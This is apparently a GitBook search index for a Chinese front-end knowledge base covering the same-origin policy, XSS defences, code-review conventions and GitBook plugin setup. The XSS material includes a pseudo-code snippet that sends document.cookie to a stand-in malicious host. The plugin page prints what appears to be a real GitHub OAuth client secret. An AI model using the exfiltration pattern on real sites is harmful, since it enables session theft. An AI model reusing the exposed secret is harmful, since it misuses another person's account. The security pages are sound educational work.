{"./":{"url":"./","title":"前言","keywords":"","body":"1.1. 我的前端知识库1.1. 我的前端知识库 欢迎有缘人！ 人生跌跌撞撞，想要活的明明白白不容易。 努力变得优秀，也是是一种奢求，但却是我追逐的方向。 何为优秀，努力留下点优秀的作品。加油 快捷入口 我的收藏 浏览器安全 GitBook教程 知识库 目前主要更新浏览器安全模块，包括： 同源策略 XSS攻击原理和实践 CSRF攻击原理和实践 Sql注入 系统安全 网络安全 CSP策略 站点监控 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"collection.html":{"url":"collection.html","title":"我的收藏","keywords":"","body":"1.1. 一、常见ui框架1.2. 二、常见图表插件1.1. 一、常见ui框架 antd 1.2. 二、常见图表插件 ECharts antv apexcharts console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"browser-security/":{"url":"browser-security/","title":"浏览器安全","keywords":"","body":"1.1.1. 浏览器安全1.1.1. 浏览器安全 浏览器安全是前端中很重要的一个模块，掌握必要的浏览器安全问题可以帮助我们的站点更安全。 浏览器安全包括的模块很多，其中最 同源策略 XSS攻击原理和实践 CSRF攻击原理和实践 Sql注入 CSP策略 这个专题主要介绍浏览器安全涉及到的模块，更新中... console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"browser-security/same-origin-policy.html":{"url":"browser-security/same-origin-policy.html","title":"同源策略","keywords":"","body":"1.1. 浏览器安全1.2. 二、浏览器是如何工作的1.3. 三、什么同源策略？1.3.1. 1、Dom安全1.3.2. 2、数据层面。1.3.3. 3、网络层面。1.4. 四、同源策略带来的一些问题1.4.1. 1、页面中可以嵌入第三方资源1.4.2. 2、跨域资源共享1.4.3. 3、跨文档消息机制1.5. 五、小结1.6. 六、参考文章1.1. 浏览器安全 无风险的世界不存在，包括浏览器，我们知道Web世界是开放的，包容的。但是开放和风险是对立的。 Web 世界会是开放的，任何资源都可以接入其中，我们的网站可以加载并执行别人网站的脚本文件、图片、音频 / 视频等资源，甚至可以下载其他站点的可执行文件。 比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情： 修改站点的 DOM、CSSOM 等信息； 在银行站点内部插入 JavaScript 脚本； 劫持用户登录的用户名和密码； 读取银行站点的 Cookie、IndexDB 等数据； 甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。 在没有安全保障的 Web 世界中，我们是没有隐私的，因此需要安全策略来保障我们的隐私和数据的安全，这就引出了页面中最基础、最核心的安全策略，同源策略（Same-origin policy） 浏览器安全可以分为三大块——Web 页面安全、浏览器网络安全、浏览器系统安全 1.2. 二、浏览器是如何工作的 思考几个问题： 为什么某些页面会崩溃？ 为什么页面崩溃后重新打开就正常了？ 为什么单个tab页面、插件崩溃不会影响其他Tab？ 为什么有时候浏览器突然退出？ 浏览器的多进程架构 1.3. 三、什么同源策略？ 如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源 http://ux.admin.com/task http://wx.admin.com/ticket https://ux.admin.com/ticket http://csm.admin.com/dashboard https://ux.admin.com:8080/api 浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。 1.3.1. 1、Dom安全 通过window.open打开页面 1.3.2. 2、数据层面。 同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。 1.3.3. 3、网络层面。 同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。你还记得在 以上就是同源策略，同源策略会隔离不同源的Dom、数据和网络通信等。 但在实际工作中，常常需要不同域名进行访问，不同资源的访问，所以为了发展，就需要出让一些安全策略，满足发展的需要。 1.4. 四、同源策略带来的一些问题 1.4.1. 1、页面中可以嵌入第三方资源 Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。 比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。 比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码： 当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。 除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码： function onClick(){ let url = `http://malicious.com?cookie = ${document.cookie}` open(url) } onClick() 在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。 以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。 CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码 通过这些手段就可以大大减少 XSS 攻击。 1.4.2. 2、跨域资源共享 为了解决这个问题，我们引入了跨域资源共享（CORS) 使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。 正常情况下发送跨域请求，浏览器自动添加Origin字段，告诉服务器本次请求的协议、域名和端口号 GET /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 返回相应头中包含了可以允许跨域的信息，如果响应头中没有包含Access-Control-Allow-Origin，就可能出现错误 Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 withCredentials CORS请求默认不发送Cookie和HTTP认证信息 如果要发送服务器，服务器和客户端都要增加参数 Access-Control-Allow-Credentials: true var xhr = new XMLHttpRequest(); xhr.withCredentials = true; 1.4.3. 3、跨文档消息机制 可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。 /* * A窗口的域名是，以下是A窗口的script标签下的代码： */ var popup = window.open(...popup details...); // 如果弹出框没有被阻止且加载完成 // 这行语句没有发送信息出去，即使假设当前页面没有改变location（因为targetOrigin设置不对） popup.postMessage(\"The user is 'bob' and the password is 'secret'\", \"https://secure.example.net\"); // 假设当前页面没有改变location，这条语句会成功添加message到发送队列中去（targetOrigin设置对了） popup.postMessage(\"hello there!\", \"http://example.org\"); function receiveMessage(event) { // 我们能相信信息的发送者吗? (也许这个发送者和我们最初打开的不是同一个页面). if (event.origin !== \"http://example.org\") return; // event.source 是我们通过window.open打开的弹出页面 popup // event.data 是 popup发送给当前页面的消息 \"hi there yourself! the secret response is: rheeeeet!\" } window.addEventListener(\"message\", receiveMessage, false); 1.5. 五、小结 1.6. 六、参考文章 阮一峰CORS csp console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"browser-security/xss.html":{"url":"browser-security/xss.html","title":"XSS攻击","keywords":"","body":"1.1. 一、前言1.2. 二、XSS攻击1.2.1. 1、什么是XSS攻击1.2.2. 2、XSS攻击的分类1.2.3. 3、其他相关案例1.3. 三、防止XSS攻击的办法1.3.1. 1、过滤关键字1.3.2. 2、前端框架和组件的使用1.3.3. 3、严格执行CSP策略1.3.4. 4、给Cookie设置HttpOnly1.1. 一、前言 由于浏览器同源策略，限制了页面无法引用第三方资源，无法请求不同源下面的资源，影响了web的发展，所以浏览器出让了一些安全策略来满足web的发展。 通过CSP安全策略来保证浏览器可以安全的加载第三方资源； 通过CORS允许浏览器跨域请求； 通过PostMessage来操作DOM 但这些策略也给了黑客攻击我们的站点的机会。 web站点常见的攻击方式包括：XSS攻击，CSRF攻击、Sql注入攻击等。 1.2. 二、XSS攻击 1.2.1. 1、什么是XSS攻击 XSS攻击（跨站脚本攻击），黑客通过网站的漏洞，将恶意脚本插入Html页面，当用户打开站点时，由于恶意脚本和站点代码拥有同样的执行权限，恶意脚本就有可能篡改站点内容，窃取用户信息发送到第三方服务器。 恶意代码一般会做下面这些攻击： 获取用户Cookies 修改用户DOM，伪造登录页面 生成浮窗广告 监听用户输入 1.2.2. 2、XSS攻击的分类 XSS攻击常被分为三类：存储型攻击、反射型攻击、基于DOM的XSS攻击。 前两种一般要经过服务器，所以后端研发更需要注意，而最后一种没有经过服务器，是需要前端注意避免的。 1）存储型攻击 一个真实的案例就是：2015年乌云网爆出来的，喜玛拉雅站点，编辑上传专辑名称，未对录入表单进行过滤，黑客可以上传恶意脚本到服务器。当其他用户点击这张专辑的时候，就执行了恶意脚本，恶意脚本获取用户的Cookies信息，上传到黑客的服务器，然后就可以登录用户的站点。 第一步：输入恶意脚本到站点，没有过滤，所以可以上传到服务器 第二步：当用户点击该专辑后，执行了恶意脚本，后端代码没有禁止第三方站点发出的请求，所以黑客就获取了用户的Cookies，接着就可以访问用户的站点或者调用站点的API 我们来模拟下存储型攻击 2）反射型攻击 反射型XSS攻击的常见模式是，黑客发现了网站存在将url的参数直接在页面上显示，并且没有过滤的情况，于是黑客就构造带有恶意脚本的链接，诱导用户点击，当用户点击了链接，就将恶意代码注入到了页面并执行，从而获取用户信息等。 反射型攻击案例： 页面中又直接渲染html的变量，直接渲染html的，如下代码，直接读取url参数query， 在页面展示，如果后端服务没有经过过滤，就有可能将query的代码引入页面中执行，造成攻击 3)基于DOM的XSS攻击 该攻击可以是一些流氓软件或攻击路由器，在http请求返回的过程中，在返回的数据中插入了恶意代码，前端站点如果没有过滤，就可能出现执行恶意代码的情况。 1.2.3. 3、其他相关案例 1、页面读取html显示，后端通过抓取邮件内容，生成html，给到前端展示。由于邮件中可能存在一些非法标签，浏览器在解析中无法识别，就导致浏览器crash，常常使用插件或者js过滤，转译等。 2、给朋友发送一个页面的脚本，其中alert了6次，并且获取了浏览器Cookies 攻击测试 window.onload = () => { document.cookie = \"username=test\" for(let i=0; i 你被攻击了 打开页面后： 如果将其中的攻击脚本插入用户的页面中，然后向第三方服务器发送cookies，这就构成了XSS攻击 1.3. 三、防止XSS攻击的办法 阻止XSS攻击，要先知道XSS攻击的原理：一般分为两个步骤。 第一步：黑客找到站点的漏洞，想站点插入恶意脚本。 第二步：读取站点的信息，发送到第三方服务器。 XSS攻击主要有以下方法注入： html中的script脚本 凡事可以请求第三方数据的地方：标签的属性Img的src属性、a标签的href属性、background:url() js脚本的拼接特殊字符 对于后端来说，主要有以下几处常常不可信： 用户输入内容 url参数 post参数 第三方的链接 referere Cookies 1.3.1. 1、过滤关键字 对于存储型XSS攻击和反射型XSS攻击，二者由于都需要过服务器，那么只要后端开发在入库的时候最敏感代码进行过滤进行过滤，就可以避免大部分的XSS攻击。 1.3.2. 2、前端框架和组件的使用 目前对于前端的大部分组件（富文本组件）和常见的Vue、React框架都对展示的数据，只会展示以字符串进行展示。 对于有可能嵌入恶意代码的部分也贴心的增加了提示： 如在Vue中： 在React中： }} > 这些可能导致XSS攻击的地方，框架都给了显著的提示，所以在页面显示这些不可控的内容前要进行过滤。 1.3.3. 3、严格执行CSP策略 设置CSP，现在站点加载或发送请求到第三方服务器 1.3.4. 4、给Cookie设置HttpOnly 给cookies设置了该属性，当前页面重要的Cookie就无法通过js读取，这样黑客也就无法获取用户的信息 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"browser-security/CSRF.html":{"url":"browser-security/CSRF.html","title":"CSRF攻击","keywords":"","body":"1.1. CSRF攻击1.1.1. 一、前言1.1.2. 二、什么是CSRF攻击1.1.3. 三、如何阻止CSRF攻击1.1. CSRF攻击 1.1.1. 一、前言 我们常常听到这样一句话：默认的链接不要点，那些年也听过，邮箱中的垃圾链接不要点。 因为可能是黑客发起的CSRF攻击，所以再点击之前最好是确认链接的安全性。 1.1.2. 二、什么是CSRF攻击 通过一个例子，说明CSRF攻击，早些年GMail邮箱有个漏洞，当然黑客发送攻击链接到邮箱后，用户登录邮箱打开 1.1.3. 三、如何阻止CSRF攻击 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"unknown/":{"url":"unknown/","title":"日常整理","keywords":"","body":"1.1. 暂时未分类文章1.1. 暂时未分类文章 记录一些日常的更文 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"unknown/standard.html":{"url":"unknown/standard.html","title":"前端规范","keywords":"","body":"1.1. 一、前言1.2. 二、关注点1.3. 三、基础审查1.3.1. 1、编码规范1.3.2. 2、功能验证、体验优化1.3.3. 3、代码优化1.4. 四、更多审查和优化1.4.1. 1、补充规范1.4.2. 2、HTML1.4.3. 3、CSS1.4.4. 4、ES6+来优化代码1.5. 五、细节处理1.6. 六、常用工具1.7. 七、参考资料1.1. 一、前言 最近在代码评审过程中，发现了很多问题，顺便这里也对自己Review代码做一次整理。 Code Review的目的是为了规范代码、避免Bug和优化性能，进而帮助开发者成长，而不是为了追究问题或者谁对谁错。正确认识Code Review的目的，才能相互帮助，共同成长。 1.2. 二、关注点 Code Review 要兼顾效率和质量，两者必然是矛盾的。取得平衡很重要，根据实际情况，进行Code Review。基于此，下面会整理成一份基础的Review和进阶的审查Review。 基础Review：是为了避免代码的混乱和Bug的产生，是开发周期内必须要考虑的点。 进阶Review：是为了提高编码质量，相互学习，进一步优化代码。 1.3. 三、基础审查 1、编码规范 2、代码基本逻辑、使用体验 3、代码性能、组件质量 1.3.1. 1、编码规范 规范很多，可以帮助我们提高代码的可读性，减少Bug的产生，开发中有很多常用的插件帮助我们规范代码。 变量命名，检查错误单词的VSCode插件，可以清楚的看到，标出拼写错误的单词（Code Spell Checker） 删除非必要console、注释，帮助代码整洁 Prettier代码格式化 StyleLint检查样式规则 ESlint检测告警和报错是否处理 commitizen 简单的提交规范和提交帮助工具，推荐 Husky代码提交前检测 虽然webpack打包会帮助我们清除一些无效的引入，但是这会导致代码可读性变差，越来越多的告警，屏蔽了我们对错误的查找。 上面的规则看似多，其实都是自动执行的，提交代码前会先执行Prettier，然后触发StyleLint和ESLint自动检测，通过后方可提交代码 1.3.2. 2、功能验证、体验优化 这方面的优化主要在于开发对于产品的感觉和态度，没有更好的办法，只能一个版本一个版本的打磨和改进。 1）预发环境自测通过，功能是否实现 给其他同事或产品的时候，一定要通过预发环境的功能自测，开始写代码的时候往往会出现本地运行没问题，发布预发后，直接提交review或产品。 然后出现很多奇奇怪怪的问题，类似：预发环境没有数据，权限不通、账号异常，网络不通 2）兼容性测试，最简单的大小屏测试 上面的在大屏幕调试后，看起来很完美，到了小屏幕就变成了这样，这肯定是不能忍的。 这些问题导致你写的产品，体验超级差，给人留下很不好的印象，写了还不如不写。 3）站在用户的角度思考产品的使用体验，操作的易用性 最近越来越意识到产品思维对于前端的重要性。开发的产品如果使用体验差，就很难有用户使用，那么也没有存在价值。 比如下面的一个简简单单的表格展示： 字段未翻译 没有筛选 状态不区分 样式丑陋 网络差的情况下时候loading或报错处理 换位思考下，如果我是用户： 查完数据，看着一串ID，这是啥？ 要找我想要的数据，一页一页的翻？ 打开页面网络差的时候，等了半分钟不知道页面在处理中。。 当你站在使用者的立场上就知道了优化的方向：用户体验，凡是影响使用体验的地方都应该优化。 比如用户使用表格查询数据，我们能做的优化： 1、查询数据：常用数据的筛选 2、帮助用户聚焦，隐藏一下非必要的字段 3、翻译字段，数据格式化 4、自适应屏幕大小 5、提供下载自定义表头等 6、loading、报错处理等 1.3.3. 3、代码优化 1）封装重复代码 比如上面两段代码，第一段是转化分钟到格式化时间，第二段是转化秒到格式化时间 完全可以通过变量进行区分入参、或者将分钟转化成秒再统一使用第二段函数调用 2）拆分处理多个逻辑的函数 上面的函数做了两个事情，一个是处理参数，一个是请求数据，如果后面我们需要传递不同的参数或同步调用，就要重新写一遍调用函数。 类似的函数，最好能做到一个函数处理一个功能，简洁明了易于扩展。 3）删除冗余代码，提前结束循环 let arr = [0,1,2,3,4,5,6,7,8,9] let result = 0 for(let i=0; i类似上面的代码，当i 4）提取常量到单独文件 5）一些字段缺失造成页面Crash(必要时引入TS) JS动态语言的特点，导致很容易出现读取某个对象属性的时候，属性不存在，JS报错，如果有必要可以引入TS或者对必要参数做好兼容 6）符合组件规范，封装是否具有可扩展性，是否易于使用。 前端大部分工作都在和组件打交道，但封装好一个组件绝不是简简单单的事，比如下面这个根据分数显示不同颜色的分数值，这确实实现了业务，但是太过业务和固化，明明可以一个对象解决的问题。 { 500: \"#f522dd\", 200: \"#faad14\", 50: \"#52c41a\", 20: \"#1890ff\", 10: \"#1890ff\" } 但代码Review毕竟是有成本的，经过以上的基础审查，其实可以避免很多Bug的产生。如果有余力，也可以继续对代码进行深一层的复盘。 1.4. 四、更多审查和优化 1.4.1. 1、补充规范 上面展示了一些规范，这里还能有更多 CSS命名可以使用短横线的方式.font-size-12 .float-left JS变量命令：常量全部大写 const API = \"http://demo.com\"，变量可以使用下划线或者小驼峰写法review_code reviewCode Git分支管理规范（Git有自带的工作流管理） Git提交规范(插件实现) (): 提交格式说明 1、type代表了某次提交的类型，比如修复一个bug还是新的功能上线，所有的type类型如下： 2、feat: 新增feature 3、fix: 修复bug 4、docs: 仅仅文档修改 5、style: 修改了空格，格式化等 6、refactor: 代码重构，没有添加新功能或修复bug 7、perf: 优化代码，提升代码性能，体验 8、test: 测试用例 9、chore: 改变构建流程，增加依赖库，工具等 10、revert: 回滚到上一个版本 1.4.2. 2、HTML 避免多余的标签嵌套 使用语义化标签 合理使用mate标签 1.4.3. 3、CSS 1）避免使用会导致重绘和重排的方法 1、添加或者删除可见的 DOM 元素； 2、元素尺寸改变——边距、填充、边框、宽度和高度 3、内容变化，比如用户在 input 框中输入文字 4、浏览器窗口尺寸改变——resize 事件发生时 5、计算 offsetWidth 和 offsetHeight 属性 6、设置 style 属性的值 2）减少重绘重排的方法 1、使用 transform 替代 top 2、使用 visibility 替换 display: none ，因为前者只会引起重绘，后者会引发回流（改变了布局） 3、不要用循环的下标作为循环的key，增减元素，会导致所有节点重排 4、不要使用 table 布局，可能很小的一个小改动会造成整个 table 的重新布局 5、动画实现的速度的选择，动画速度越快，回流次数越多，也可以选择使用 requestAnimationFrame 6、CSS 选择符从右往左匹配查找，避免节点层级过多 1.4.4. 4、ES6+来优化代码 新的语法特性可以帮助我们简化代码写法，同时提高性能，但同时要注意兼容性。 1、删除非必要的Debug打印内容和注释 2、提取常量和枚举值 3、多余的if else或简单的switch case，使用map映射或者三元表达式代替 4、箭头函数代替function函数 5、使用解构赋值、定义变量、读取参数等 6、使用Promise减少函数回调 7、includesif(a === 1 || a === 2 || a === 3){ return true } // 替换 if([1,2,3].includes(a)){ return true } 8、模版字符串代替+ 9、数组去重，遍历对象let arr = [...new Set([1,2,3,2,3,5])] const data = { a: 1, b: 2 } Object.keys(data).map(key => { console.log(key, data[key]) }) 1.5. 五、细节处理 俗话不是说：细节决定成败。细节真的很重要，那些优秀的作品往往都是在完成的基础上增加了许多细节。 按钮有无节流或防抖，筛选、远程查询 状态显示使用不同的图标，常见按钮替换成图标 下面作为对比 增加一些切换的动画，优化体验 1.6. 六、常用工具 Permitter pre-commit ESLint 单词拼写检查【Code Spell Checker】 函数、代码注释规范【Add jsdoc comments】 1.7. 七、参考资料 https://www.cnblogs.com/jserhub/p/11924289.html https://juejin.cn/post/6844903897610321934#111-%E7%89%88%E6%9C%AC%E8%A7%84%E8%8C%83 https://juejin.cn/post/6844903671457677325 https://typicode.github.io/husky/#/?id=features console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"gitbook/":{"url":"gitbook/","title":"GitBook教程","keywords":"","body":"1. gitbook的使用1.1. gitbook-cli安装1.2. 创建项目1.3. 打包构建1.4. 生成目录1.5. 关联gitbook网站，生成网站效果1.6. gitbook目录结构1. gitbook的使用 1.1. gitbook-cli安装 npm i -g gitbook-cli gitbook -V 1.2. 创建项目 mkdir git-learn cd git-learn 1.3. 打包构建 gitbook build 默认生成_book下 gitbook build ./ ./docs 1.4. 生成目录 gitbook init gitbook serve 目录结构见SUMMARY.md 1.5. 关联gitbook网站，生成网站效果 1.6. gitbook目录结构 如何在markdown中打印项目目录结构 https://www.jianshu.com/p/e38a07f824a2 Gitbook各种使用方法参考文章 https://juejin.im/post/6844903793033740302 Gitbook使用方法 https://yangjh.oschina.io/gitbook/faq/Plugins.html gitbook插件参考 https://www.jianshu.com/p/427b8bb066e6 可参考优秀的文档 https://snowdreams1006.gitbook.io/www/#ke-long-wang-zhan console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"gitbook/plugin.html":{"url":"gitbook/plugin.html","title":"插件","keywords":"","body":"1. 插件1.1. 安装插件1.2. 常用插件1.3. 其他1.4. book.json文件1.5. 各个插件展示1.5.1. 目录相关内容1.6. 静态文件利用github进行评论的方法gittalk1. 插件 1.1. 安装插件 // book.json文件，见根目录 touch book.json // 下载插件使用gitbook install,不要使用npm,会出现插件不起作用的情况,可能和网络有关 gitbook install // 安装插件（不推荐使用） npm install gitbook-plugin-[插件名] 1.2. 常用插件 删除原有插件 删除自带的gitbook标识 安装分享、搜索插件 目录插件 目录折叠 页面目录导航 插入音频 插入音乐 插入视频 插入图片 导出pdf等格式电子书 导入github点赞内容 赞助 页面过长返回顶部 页面阅读统计 页面code复制 页面评论 跳转github编辑页面 页面待办事件 1.3. 其他 打印项目目录https://www.npmjs.com/package/treer 插入音频 视频插入 插入音乐 github仓库内容 1.4. book.json文件 { \"title\": \"Git入门到进阶\", \"description\": \"Git入门，Git常用的方法和工作中常见的问题，gitlab、github等仓库的使用\", \"author\": \"pengfei.lv\", \"language\": \"zh-hans\", \"root\": \".\", \"plugins\": [ \"edit-link\", //在github编辑 \"copy-code-button\", //复制代码 \"splitter\", //调节左侧边栏 \"pageview-count\", //统计浏览量 \"popup\", \"-sharing\", //删除gitbook自带的分享功能 \"sharing-plus\", //分享插件 \"chapter-fold\", //目录折叠 \"expandable-chapters\", \"-lunr\", \"github\", //github图表 \"gittalk\", //github评论 \"anchor-navigation-ex\", //页面导航 \"simple-page-toc\" // 页面目录 ], \"pluginsConfig\": { \"github-buttons\": { \"repo\": \"richLpf/gitbook\", \"types\": [ \"star\" ], \"size\": \"small\" }, \"edit-link\": { \"base\": \"https://github.com/richLpf/gitbook\", \"label\": \"编辑当前页面\" }, \"sharing\": { \"all\": [\"weibo\", \"qq\", \"qzone\", \"douban\"] }, \"chapter-fold\":{}, \"github\": { \"url\": \"https://github.com/richLpf/gitbook\" }, \"simple-page-toc\": { \"maxDepth\": 3, \"skipFirstH1\": true }, \"gittalk\": { \"clientID\": \"e893b71fc36998d82f8e\", \"clientSecret\": \"d25b2490666b9105dea0c7ecfbae294a4eef9caa\", \"repo\": \"gitbook\", \"owner\": \"richLpf\", \"admin\": [ \"richLpf\" ], \"distractionFreeMode\": false }, \"anchor-navigation-ex\": { \"associatedWithSummary\": true } } } 1.5. 各个插件展示 1.5.1. 目录相关内容 \"simple-page-toc\"生成右侧悬浮目录 { \"plugins\": [ \"page-treeview\" ], \"pluginsConfig\": { \"page-treeview\": { \"copyright\": \"Copyright &#169; aleen42\", \"minHeaderCount\": \"2\", \"minHeaderDeep\": \"2\" } } } 如图所示：gitbook-menu.png \"page-treeview\"生成页面头部目录 { \"plugins\": [ \"page-treeview\" ], \"pluginsConfig\": { \"page-treeview\": { \"copyright\": \"Copyright &#169; aleen42\", \"minHeaderCount\": \"2\", \"minHeaderDeep\": \"2\" } } } 如图所示： flexible-alerts 警报 > [!NOTE] > 这是一个简单的Note类型的使用，所有的属性都是默认值。 1.6. 静态文件利用github进行评论的方法gittalk \"gittalk\": { \"clientID\": \"e893b71fc36998d82f8e\", \"clientSecret\": \"d25b2490666b9105dea0c7ecfbae294a4eef9caa\", \"repo\": \"gitbook\", \"owner\": \"richLpf\", \"admin\": [ \"richLpf\" ], \"distractionFreeMode\": false } 参数获取方法： console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"gitbook/deploy.html":{"url":"gitbook/deploy.html","title":"部署","keywords":"","body":"1. 部署1. 部署 将gitbook部署在github页面上 参考文档 https://juejin.im/post/6844903793033740302 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"gitbook/more.html":{"url":"gitbook/more.html","title":"常用插件","keywords":"","body":"1. 常用插件1. 常用插件 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"}}